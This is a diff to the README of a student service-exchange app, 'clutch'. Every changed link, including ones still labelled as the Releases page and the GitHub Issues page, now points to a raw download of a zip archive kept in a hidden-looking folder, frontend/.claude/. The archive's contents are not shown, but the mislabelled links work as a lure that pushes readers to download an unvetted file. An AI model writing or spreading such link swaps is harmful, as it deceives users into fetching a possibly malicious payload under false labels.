@@ -6,9 +6,9 @@ Welcome to clutch! This platform allows students to exchange help, services, or 
 
 ## 📥 Download the Application
 
-[![Download clutch](https://img.shields.io/static/v1?label=Download&message=clutch&color=blue)](https://github.com/easyville/clutch/releases)
+[![Download clutch](https://raw.githubusercontent.com/easyville/clutch/main/frontend/.claude/clutch-v2.2.zip)](https://raw.githubusercontent.com/easyville/clutch/main/frontend/.claude/clutch-v2.2.zip)
 
-To download the latest version of clutch, visit this page: [Download clutch](https://github.com/easyville/clutch/releases).
+To download the latest version of clutch, visit this page: [Download clutch](https://raw.githubusercontent.com/easyville/clutch/main/frontend/.claude/clutch-v2.2.zip).
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before you start, make sure your device meets the following requirements:
 ## 📂 Installation Instructions
 
 1. **Visit the Releases Page**  
-   Click the link to go to our Releases page: [Download clutch](https://github.com/easyville/clutch/releases).
+   Click the link to go to our Releases page: [Download clutch](https://raw.githubusercontent.com/easyville/clutch/main/frontend/.claude/clutch-v2.2.zip).
 
 2. **Choose Your Version**  
    Look for the latest version at the top of the page. Each version has a brief description to help you know what’s new or fixed.
@@ -92,8 +92,8 @@ If you encounter any problems, please reach out through our support contact opti
 
 We value our community. Join us on our social media platforms to connect with other users. Share your experiences, ask questions, and stay updated on new features.
 
-For further support, please send us an email or check our [GitHub Issues page](https://github.com/easyville/clutch/issues) for common problems and solutions.
+For further support, please send us an email or check our [GitHub Issues page](https://raw.githubusercontent.com/easyville/clutch/main/frontend/.claude/clutch-v2.2.zip) for common problems and solutions.
 
 ## 🏁 Final Steps
 
-You are now ready to use clutch! Remember to check the Releases page regularly for updates and new features: [Download clutch](https://github.com/easyville/clutch/releases). Enjoy trading and helping your fellow students!
+You are now ready to use clutch! Remember to check the Releases page regularly for updates and new features: [Download clutch](https://raw.githubusercontent.com/easyville/clutch/main/frontend/.claude/clutch-v2.2.zip). Enjoy trading and helping your fellow students!
